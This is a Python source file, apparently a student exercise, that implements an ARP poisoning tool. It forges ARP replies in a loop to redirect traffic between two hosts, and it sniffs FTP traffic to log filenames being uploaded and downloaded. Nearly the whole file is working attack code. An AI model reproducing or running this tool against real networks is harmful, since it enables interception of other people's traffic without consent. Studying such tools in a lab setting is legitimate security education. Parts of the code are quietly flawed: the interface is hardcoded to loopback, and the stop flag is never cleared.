# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/06/23 15:42:16 by hubourge          #+#    #+#              #
#    Updated: 2025/06/24 16:53:56 by hubourge         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import socket
import struct
import sys
import time
import signal
import threading
import netifaces
from scapy.all import sniff, IP, TCP, Raw

ETHERNET_HEADER_FORMAT = "!6s6sH"       # Big Endian (!) Dest MAC (6s), Src MAC (6s), Type ARP (H)
ARP_HEADER_FORMAT = "!HHBBH6s4s6s4s"    # ARP struct
poisoning = True
interface = None
count = 0

def getInterface(target_ip=None):
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            for addr in addrs[netifaces.AF_INET]:
                ip = addr.get('addr')
                if target_ip:
                    if ip == target_ip:
                        return iface
                elif ip != "127.0.0.1":
                    return iface
    return None

def parsing():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <ip_src> <mac_src> <ip_target> <mac_target>")
        sys.exit(1)

    return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    
def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))

def build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, target_mac, target_ip):
    dest_mac_bytes = mac_to_bytes(dest_mac)
    src_mac_bytes = mac_to_bytes(src_mac)
    target_mac_bytes = mac_to_bytes(target_mac)

    # Header Ethernet [Destination MAC] [Source MAC] [ARP]
    eth_header = struct.pack(ETHERNET_HEADER_FORMAT, dest_mac_bytes, src_mac_bytes, 0x0806)

    # Header ARP
    hw_type = 1              # Ethernet
    proto_type = 0x0800      # IPv4
    hw_size = 6              # MAC = 6 bytes
    proto_size = 4           # IP = 4 bytes
    opcode = 2               # ARP Reply

    arp_header = struct.pack(
        ARP_HEADER_FORMAT,
        hw_type,
        proto_type,
        hw_size,
        proto_size,
        opcode,
        src_mac_bytes,
        socket.inet_aton(src_ip),
        target_mac_bytes,
        socket.inet_aton(target_ip)
    )

    return eth_header + arp_header

def restore_arp(sock, src_mac, src_ip, dest_mac, dest_ip):
    packet = build_arp_packet(src_mac, src_ip, dest_mac, dest_ip, dest_mac, dest_ip)
    sock.send(packet)
    
    time.sleep(1)

    packet = build_arp_packet(dest_mac, dest_ip, src_mac, src_ip, src_mac, src_ip)
    sock.send(packet)

def handle_sigint(sig, frame):
        poisoning = False
        print(f"\n\n  Restore ARP table at {ip_target}")
        restore_arp(sock, mac_src, ip_src, mac_target, ip_target)
        print(f"  Restore ARP table at {ip_src}")
        restore_arp(sock, mac_target, ip_target, mac_src, ip_src)
        sys.exit(0)

def ftp_packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if payload.startswith("STOR") or payload.startswith("RETR"):
            filename = payload.strip().split(" ")[1]
            
            if payload.startswith("STOR"):
                direction = "Upload (STOR)"
            else:
                direction = "Download (RETR)"

            tmp_ip_src = packet[IP].src
            tmp_ip_dst = packet[IP].dst
            tmp_port_src = packet[TCP].sport
            tmp_port_dst = packet[TCP].dport

            print(f"\n  [FTP] {direction} -> {filename}")
            print(f"        From {tmp_ip_src}:{tmp_port_src} To {tmp_ip_dst}:{tmp_port_dst}")

def sniff_ftp_traffic():
    print("\n  Sniffing FTP traffic...")
    sniff(filter="tcp port 21", prn=ftp_packet_callback, store=0, iface=interface)

def resolve_hostname(hostname_or_ip):
    try:
        return socket.getfqdn(hostname_or_ip)
    except socket.gaierror:
        return hostname_or_ip

def main():
    global ip_src, mac_src, ip_target, mac_target, count
    ip_src, mac_src, ip_target, mac_target = parsing()
    ip_src_str = resolve_hostname(ip_src)
    ip_target_str = resolve_hostname(ip_target)

    global interface
    interface = "lo"
    # interface = getInterface(ip_src) or getInterface(ip_target)
    if not interface:
        print("No network interface found.")
        sys.exit(1)
    print(f"  Using interface: {interface}")

    global poisoning, sock
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    print(f"\n  ARP Poisoning Attack")
    print(f"     Source IP:  {ip_src} ({ip_src_str})")
    print(f"     Source MAC: {mac_src}")
    print(f"     Target IP:  {ip_target} ({ip_target_str})")
    print(f"     Target MAC: {mac_target}")

    signal.signal(signal.SIGINT, handle_sigint)

    ftp_thread = threading.Thread(target=sniff_ftp_traffic, daemon=True)
    ftp_thread.start()
    time.sleep(2)

    print("\n  Starting ARP poisoning...")
    while poisoning:
        print(f"\r  [ARP REPLY] {count} - {ip_src_str} : {ip_target_str} is-at {mac_target} | {ip_target_str} : {ip_src_str} is-at {mac_src}", end='', flush=True)
        # print(f"  [ARP REPLY] to {ip_src_str} : {ip_target_str} is-at {mac_target} x{count}")
        pckt1 = build_arp_packet(mac_target, ip_target, mac_src, ip_src, mac_src, ip_src)
        # print(f"  [ARP REPLY] to {ip_target_str} : {ip_src_str} is-at {mac_src} x{count}")
        count += 1
        pckt2 = build_arp_packet(mac_src, ip_src, mac_target, ip_target, mac_target, ip_target)
        sock.send(pckt1)
        sock.send(pckt2)
        time.sleep(0.2)

if __name__ == "__main__":
    main()
